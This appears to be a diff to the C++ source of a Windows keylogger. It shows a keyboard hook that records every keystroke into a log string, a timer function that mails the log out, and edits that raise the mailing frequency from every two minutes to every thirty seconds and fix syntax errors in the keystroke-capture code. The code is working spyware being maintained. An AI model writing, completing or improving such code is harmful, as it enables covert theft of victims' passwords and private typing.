@@ -32,7 +32,7 @@ void TimerSendMail()
         keylog = "";
 }
 //2000 * 60 = 2 minutes
-Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite);
+Timer MailTimer(TimerSendMail, 500 * 60, Timer::Infinite);
 
 HHOOK eHook = NULL;
 
@@ -70,8 +70,8 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
         )
         {
             std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
-            KeyName.insert(1, "/";
-            keylog += KeyName;)
+            KeyName.insert(1, "/");
+            keylog += KeyName;
         }
     }
 
@@ -91,7 +91,7 @@ bool InstallHook()
 
 bool UninstallHook()
 {
-    bool b = UnhookWindowsHookEx(eHook);
+    BOOL b = UnhookWindowsHookEx(eHook);
     eHook = NULL;
     return(bool) b;
 }
